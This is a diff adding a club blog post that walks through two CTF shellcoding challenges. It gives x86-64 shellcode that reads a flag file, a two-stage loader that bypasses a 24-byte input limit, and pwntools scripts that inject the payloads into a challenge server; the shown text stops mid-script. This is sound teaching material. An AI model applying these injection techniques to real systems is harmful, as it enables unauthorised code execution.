@@ -1,0 +1,736 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=robots content="noodp">
+<meta http-equiv=x-ua-compatible content="IE=edge, chrome=1">
+<title>Walkthrough: Shellcoding Challenges - CUEH ComSec</title><meta name=Description content="A walkthrough of the shellcoding challenges on CTFd"><meta property="og:title" content="Walkthrough: Shellcoding Challenges">
+<meta property="og:description" content="A walkthrough of the shellcoding challenges on CTFd">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://cov-comsec.github.io/posts/2021_assembly_and_shellcoding_walkthrough/"><meta property="og:image" content="https://cov-comsec.github.io/logo.svg"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-11-07T10:40:28+01:00">
+<meta property="article:modified_time" content="2021-11-07T17:37:45+00:00">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://cov-comsec.github.io/logo.svg">
+<meta name=twitter:title content="Walkthrough: Shellcoding Challenges">
+<meta name=twitter:description content="A walkthrough of the shellcoding challenges on CTFd">
+<meta name=application-name content="CUEH ComSec">
+<meta name=apple-mobile-web-app-title content="CUEH ComSec"><meta name=msapplication-TileColor content="#da532c"><link rel=stylesheet href=/css/forms.css media=screen><link rel=icon href=/CUEH.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://cov-comsec.github.io/posts/2021_assembly_and_shellcoding_walkthrough/><link rel=prev href=https://cov-comsec.github.io/posts/2021_shellcode_challenges_walkthrough/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Walkthrough: Shellcoding Challenges","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/cov-comsec.github.io\/posts\/2021_assembly_and_shellcoding_walkthrough\/"},"image":["https:\/\/cov-comsec.github.io\/CUEH.svg"],"genre":"posts","keywords":"pwn, assembly, shellcode, ctf","wordcount":1923,"url":"https:\/\/cov-comsec.github.io\/posts\/2021_assembly_and_shellcoding_walkthrough\/","datePublished":"2021-11-07T10:40:28+01:00","dateModified":"2021-11-07T17:37:45+00:00","publisher":{"@type":"Organization","name":"Jack Orcherton","logo":"https:\/\/cov-comsec.github.io\/CUEH.svg"},"author":{"@type":"Person","name":"Mattia Donadelli"},"description":"A walkthrough of the shellcoding challenges on CTFd"}</script></head>
+<body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script>
+<div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
+<div class=header-wrapper>
+<div class=header-title>
+<a href=/ title="CUEH ComSec"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/CUEH.svg data-srcset="/CUEH.svg, /CUEH.svg 1.5x, /CUEH.svg 2x" data-sizes=auto alt=/CUEH.svg title=/CUEH.svg>ComSec</a>
+</div>
+<div class=menu>
+<div class=menu-inner><a class=menu-item href=/about/> About </a><a class=menu-item href=/posts/> Posts </a><a class=menu-item href=/tags/> Tags </a><a class=menu-item href=/categories/> Categories </a><a class=menu-item href=https://cueh-comsec.ctfd.io/ rel="noopener noreffer" target=_blank> CTFd </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search>
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear>
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id=search-loading-desktop>
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw"></i>
+</a>
+</div>
+</div>
+</div>
+</header><header class=mobile id=header-mobile>
+<div class=header-container>
+<div class=header-wrapper>
+<div class=header-title>
+<a href=/ title="CUEH ComSec"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/CUEH.svg data-srcset="/CUEH.svg, /CUEH.svg 1.5x, /CUEH.svg 2x" data-sizes=auto alt=/CUEH.svg title=/CUEH.svg>ComSec</a>
+</div>
+<div class=menu-toggle id=menu-toggle-mobile>
+<span></span><span></span><span></span>
+</div>
+</div>
+<div class=menu id=menu-mobile><div class=search-wrapper>
+<div class="search mobile" id=search-mobile>
+<input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search>
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear>
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id=search-loading-mobile>
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</div>
+<a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>
+Cancel
+</a>
+</div><a class=menu-item href=/about/ title>About</a><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=https://cueh-comsec.ctfd.io/ title rel="noopener noreffer" target=_blank>CTFd</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw"></i>
+</a></div>
+</div>
+</header>
+<div class="search-dropdown desktop">
+<div id=search-dropdown-desktop></div>
+</div>
+<div class="search-dropdown mobile">
+<div id=search-dropdown-mobile></div>
+</div>
+<main class=main>
+<div class=container><div class=toc id=toc-auto>
+<h2 class=toc-title>Contents</h2>
+<div class=toc-content id=toc-content-auto></div>
+</div><article class="page single"><h1 class="single-title animated flipInX">Walkthrough: Shellcoding Challenges</h1><div class=post-meta>
+<div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Mattia Donadelli</a></span>&nbsp;<span class=post-category>included in <a href=/categories/academic-year-2021-22/><i class="far fa-folder fa-fw"></i>Academic Year 2021-22</a></span></div>
+<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-11-07>2021-11-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1923 words&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;10 minutes&nbsp;</div>
+</div><div class="details toc" id=toc-static kept=true>
+<div class="details-summary toc-title">
+<span>Contents</span>
+<span><i class="details-icon fas fa-angle-right"></i></span>
+</div>
+<div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents>
+<ul>
+<li><a href=#preparation-for-the-challenges>Preparation for the challenges</a></li>
+<li><a href=#solution-shellcode-challenge-1>Solution: Shellcode Challenge 1</a></li>
+<li><a href=#solution-shellcode-challenge-2>Solution: Shellcode Challenge 2</a></li>
+<li><a href=#task-3>Task 3</a></li>
+<li><a href=#conclusion>Conclusion</a></li>
+</ul>
+</nav></div>
+</div><div class=content id=content><p>As promised by Ben in <a href=https://cov-comsec.github.io/posts/2021_assembly_and_shellcoding/ target=_blank rel="noopener noreffer">Assembly & Shellcoding</a>, this article will cover the solutions for the Shellcode challenges. The challenges can be found on CTFd and is strongly recommended to try to solve the challenges on your own before continue reading this article!</p>
+<h2 id=preparation-for-the-challenges>Preparation for the challenges</h2>
+<p>Each of the following challenges will require you to send your already assembled code to the target; whose ip address and port is specified in the description of each challenge on CTFd.
+The file &lsquo;boilerplate.py&rsquo; was kindly provided and its purpose is to help assemble your code, connect to the host and inject the payload; all you have to do it insert your assembly code where required and type the ip address and port number of the target inside the brackets of the p.remote() method.</p>
+<p><em>i.e.</em></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>p</span><span class=o>.</span><span class=n>remote</span><span class=p>(</span><span class=s2>&#34;0.cloud.chals.io&#34;</span><span class=p>,</span> <span class=mi>0000</span><span class=p>)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=solution-shellcode-challenge-1>Solution: Shellcode Challenge 1</h2>
+<p>By navigating to the target a webpage presents itself which contains some information, the only one we need right now is: <em>There are no protections on this level. Just read the flag at &lsquo;/flag&rsquo;</em>. We now know that the flag is placed in a file called &ldquo;flag&rdquo; in the root directory of the target.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=na>.global</span> <span class=no>_start</span>
+<span class=na>.intel_syntax</span> <span class=no>noprefix</span>
+
+<span class=nl>_start:</span>
+<span class=nf>lea</span> <span class=no>rdi</span><span class=p>,</span> <span class=p>[</span><span class=no>rip</span><span class=err>+</span><span class=no>flag</span><span class=p>]</span>
+<span class=nf>xor</span> <span class=no>rsi</span><span class=p>,</span> <span class=no>rsi</span>
+<span class=nf>xor</span> <span class=no>rdx</span><span class=p>,</span> <span class=no>rdx</span>
+<span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=mi>2</span>
+<span class=nf>syscall</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The purpose of this first code is to use sys.open() to grab the file descriptor of our flag. A file descriptor is an unique identifier of a file and is usually a non negative integer. The first three file descriptors are reserved in this order:</p>
+<ul>
+<li>File descriptor 0: stdin</li>
+<li>File descriptor 1: stdout</li>
+<li>File descriptor 2: stderr</li>
+</ul>
+<p>The previous code loads the path of the flag, specified in a label at the end of the file, in rdi; the two xor instruction set the values of rsi and rdx to 0.
+Then the value 2 is moved in rax and syscall is executed. The first operation is made in order to set the argument for sys.open() since it needs the path of the file which the FD is going to get stored.</p>
+<p>Generally, all the values moved in registers before a syscall have the purpose to initialize the arguments for the syscall itself, apart from rax which must contain the value which specify which syscall to execute and will usually store the return value of the syscall. To give a better understanding of the syscall keyword, we can represent it like this:</p>
+<p>syscall(rax, rdi, rsi, rdx, &mldr;) where the arguments are values stored in the registers and have a strict order that can be found <a href=http://syscall.sh/ target=_blank rel="noopener noreffer">here</a>.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=nf>mov</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>1</span>
+<span class=nf>mov</span> <span class=no>rsi</span><span class=p>,</span> <span class=no>rax</span>
+<span class=nf>mov</span> <span class=no>rdx</span><span class=p>,</span> <span class=mi>0</span>
+<span class=nf>mov</span> <span class=no>r10</span><span class=p>,</span> <span class=mi>60</span>
+<span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=mi>40</span>
+<span class=nf>syscall</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Now we use sys.sendfile() to print our flag in the terminal. We use sendfile because it allows two file descriptors as arguments, one in input and the other in output; a better representation of sys.sendfile is sys.sendfile(output_fd, input_fd, offset, size) where the offset indicates where to start sending information and the size is the number of bytes that will be sent.</p>
+<p>As we can see we are sending to stdout (file descriptor 1) the contents of the flag file that we opened before (remember that, in this case, the rax contains the file descriptor for the flag file) starting from byte 0 (start of file) and will be sent 60 bytes (rough estimate, if needed this value can be increased).</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=nl>flag:</span>
+  <span class=na>.string</span> <span class=s>&#34;flag&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This last part is the label that we called in the first instruction. This label contains the string &ldquo;flag&rdquo; which represents the path to our flag file. With this part clarified we can actually understand that, in order to store this string in rdi, we must load the memory address of this label which contains the string (hence why we used lea, which stands for load effective address, instead of mov).</p>
+<p>We then type our newly finished shellcode into boilerplate.py and press enter we notice that we recieve different text compared with the first attempt (attempted with an empty payload). The target answers our code with a report of the assembly code that will be executed.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/stdout_from_target.png data-srcset="/posts/2021_assembly_and_shellcoding_walkthrough/images/stdout_from_target.png, images/stdout_from_target.png 1.5x, /posts/2021_assembly_and_shellcoding_walkthrough/images/stdout_from_target.png 2x" data-sizes=auto alt=/posts/2021_assembly_and_shellcoding_walkthrough/images/stdout_from_target.png title="Screenshot of stdout from the target"></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+
+<span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span>
+<span class=c1>#context.log_level = debug</span>
+
+<span class=k>def</span> <span class=nf>print_clean</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
+    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
+        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;latin-1&#34;</span><span class=p>))</span>
+
+<span class=c1># shellcode goes here</span>
+<span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;&#34;&#34;
+</span><span class=s2>
+</span><span class=s2>.global _start
+</span><span class=s2>.intel_syntax noprefix
+</span><span class=s2>
+</span><span class=s2>_start:
+</span><span class=s2>
+</span><span class=s2>lea rdi, [rip+flag]
+</span><span class=s2>xor rsi, rsi
+</span><span class=s2>xor rdx, rdx
+</span><span class=s2>mov rax, 2
+</span><span class=s2>syscall
+</span><span class=s2>
+</span><span class=s2>mov rdi, 1
+</span><span class=s2>mov rsi, rax
+</span><span class=s2>mov rdx, 0
+</span><span class=s2>mov r10, 60
+</span><span class=s2>mov rax, 40
+</span><span class=s2>syscall
+</span><span class=s2>
+</span><span class=s2>
+</span><span class=s2>flag:
+</span><span class=s2>  .string &#34;flag&#34;
+</span><span class=s2>
+</span><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
+
+<span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;0.cloud.chals.io&#34;</span><span class=p>,</span> <span class=mi>0000</span><span class=p>)</span>
+<span class=n>print_clean</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Reading 0x1000 bytes from stdin.</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>))</span>
+<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span>
+
+<span class=n>print_clean</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>readrepeat</span><span class=p>())</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>Here&rsquo;s the solution already implemented in &lsquo;boilerplate.py&rsquo;</p>
+<h2 id=solution-shellcode-challenge-2>Solution: Shellcode Challenge 2</h2>
+<p>First thing we do is, like the previous challenge, edit the boilerplate file with the new port and navigate to the target and observing the webpage, we can see that the flag is in the same location but that &ldquo;This challenge reads in much fewer bytes.&rdquo; and this statement is reinforced by another line that states the following: &ldquo;Reading 0x18 bytes from stdin.&rdquo;.</p>
+<p>This means that only 24 bytes (0x18 = 24) worth of instructions will be read from standard input, this means that our previous shellcode won&rsquo;t work anymore since the target will only allow execute the first 24 bytes worth of information. In order to overcome this issue we create a <code>multi stage shellcode</code>, this type of shellcode consists in sending multiple shellcodes during the same connection; in this case we will use a two staged attack.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=na>.intel_syntax</span> <span class=no>noprefix</span>
+<span class=na>.global</span> <span class=no>_start</span>
+
+<span class=nl>_start:</span>
+
+<span class=nf>push</span> <span class=mi>0</span>
+<span class=nf>push</span> <span class=mi>0</span>
+<span class=nf>pop</span> <span class=no>rdi</span>
+<span class=nf>lea</span> <span class=no>rsi</span><span class=p>,</span> <span class=p>[</span><span class=no>rip</span><span class=err>+</span><span class=mi>9</span><span class=p>]</span>
+<span class=nf>mov</span> <span class=no>rdx</span><span class=p>,</span> <span class=mi>250</span>
+<span class=nf>pop</span> <span class=no>rax</span>
+
+<span class=nf>syscall</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This code will allow us to use sys.read() in order to receive instruction from stdin, effectively bypassing the 24 bytes restriction imposed by the challenge.
+sys.read() requires three arguments: a file descriptor, a buffer and a size value.
+Being 0 the file descriptor for stdin and the value needed to invoke the syscall, we push two zeros on the stack.</p>
+<p>We load the memory address which will point to the end of our shellcode in rsi and specify 250 expected bytes. We then invoke the kernel to execute sys.read().</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=na>.global</span> <span class=no>_start</span>
+<span class=na>.intel_syntax</span> <span class=no>noprefix</span>
+
+<span class=nl>_start:</span>
+
+<span class=nl>open:</span>
+<span class=nf>lea</span> <span class=no>rdi</span><span class=p>,</span> <span class=p>[</span><span class=no>rip</span><span class=err>+</span><span class=no>flag</span><span class=p>]</span>
+<span class=nf>xor</span> <span class=no>rsi</span><span class=p>,</span> <span class=no>rsi</span>
+<span class=nf>xor</span> <span class=no>rdx</span><span class=p>,</span> <span class=no>rdx</span>
+<span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=mi>2</span>
+<span class=nf>syscall</span>
+
+<span class=nl>sendfile:</span>
+<span class=nf>mov</span> <span class=no>rdi</span><span class=p>,</span> <span class=mi>1</span>
+<span class=nf>mov</span> <span class=no>rsi</span><span class=p>,</span> <span class=no>rax</span>
+<span class=nf>mov</span> <span class=no>rdx</span><span class=p>,</span> <span class=mi>0</span>
+<span class=nf>mov</span> <span class=no>r10</span><span class=p>,</span> <span class=mi>60</span>
+<span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=mi>40</span>
+<span class=nf>syscall</span>
+
+<span class=nl>exit:</span>
+<span class=nf>mov</span> <span class=no>rax</span><span class=p>,</span> <span class=mi>60</span>
+<span class=nf>mov</span> <span class=no>rsi</span><span class=p>,</span> <span class=mi>42</span>
+<span class=nf>syscall</span>
+
+<span class=nl>flag:</span>
+  <span class=na>.string</span> <span class=s>&#34;flag&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The second shellcode is the same shellcode used in challenge 1.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>shellcode1</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;&#34;&#34; # stage 1 shellcode goes here &#34;&#34;&#34;</span><span class=p>)</span>
+<span class=n>shellcode2</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;&#34;&#34; # stage 2 shellcode goes here &#34;&#34;&#34;</span><span class=p>)</span>
+
+<span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;0.cloud.chals.io&#34;</span><span class=p>,</span> <span class=mi>0000</span><span class=p>)</span>
+<span class=n>print_clean</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Reading 0x18 bytes from stdin.</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>))</span>
+<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>shellcode1</span><span class=p>)</span>
+<span class=n>pause</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>shellcode2</span><span class=p>)</span>
+
+<span class=n>print_clean</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>readrepeat</span><span class=p>())</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>In order to successfully execute a multi-stage shellcode we also need to modify the boilerplate.py file since the two scripts must be in different payloads.
+As shown above, we create another variable in which we type our stage 1 shellcode and we send it through before the actual payload containing the stage 2 shellcode; between the two payloads we want to wait 1 second for the stage 1 shellcode to execute so we add &ldquo;pause(1)&rdquo;.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+
+<span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span>
+<span class=c1>#context.log_level = debug</span>
+
+<span class=k>def</span> <span class=nf>print_clean</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
+    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
+        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;latin-1&#34;</span><span class=p>))</span>
+
+<span class=c1># shellcode goes here</span>
+<span class=n>setup</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;&#34;&#34;
+</span><span class=s2>
+</span><span class=s2>.intel_syntax noprefix
+</span><span class=s2>.global _start
+</span><span class=s2>
+</span><span class=s2>_start:
+</span><span class=s2>main:
+</span><span class=s2>push 0
+</span><span class=s2>push 0
+</span><span class=s2>pop rdi
+</span><span class=s2>lea rsi, [rip+10]
+</span><span class=s2>mov rdx, 250
+</span><span class=s2>pop rax
+</span><span class=s2>syscall
+</span><span class=s2>
+</span><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
+
+<span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;&#34;&#34;
+</span><span class=s2>
+</span><span class=s2>.global _start
+</span><span class=s2>.intel_syntax noprefix
+</span><span class=s2>
+</span><span class=s2>_start:
+</span><span class=s2>
+</span><span class=s2>open:
+</span><span class=s2>lea rdi, [rip+flag]
+</span><span class=s2>xor rsi, rsi
+</span><span class=s2>xor rdx, rdx
+</span><span class=s2>mov rax, 2
+</span><span class=s2>syscall
+</span><span class=s2>
+</span><span class=s2>sendfile:
+</span><span class=s2>mov rdi, 1
+</span><span class=s2>mov rsi, rax
+</span><span class=s2>mov rdx, 0
+</span><span class=s2>mov r10, 60
+</span><span class=s2>mov rax, 40
+</span><span class=s2>syscall
+</span><span class=s2>
+</span><span class=s2>exit:
+</span><span class=s2>mov rax, 60
+</span><span class=s2>mov rsi, 42
+</span><span class=s2>syscall
+</span><span class=s2>
+</span><span class=s2>flag:
+</span><span class=s2>  .string &#34;flag&#34;
+</span><span class=s2>
+</span><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
+
+<span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;0.cloud.chals.io&#34;</span><span class=p>,</span> <span class=mi>0000</span><span class=p>)</span>
+<span class=n>print_clean</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Reading 0x18 bytes from stdin.</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>))</span>
+<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>setup</span><span class=p>)</span>
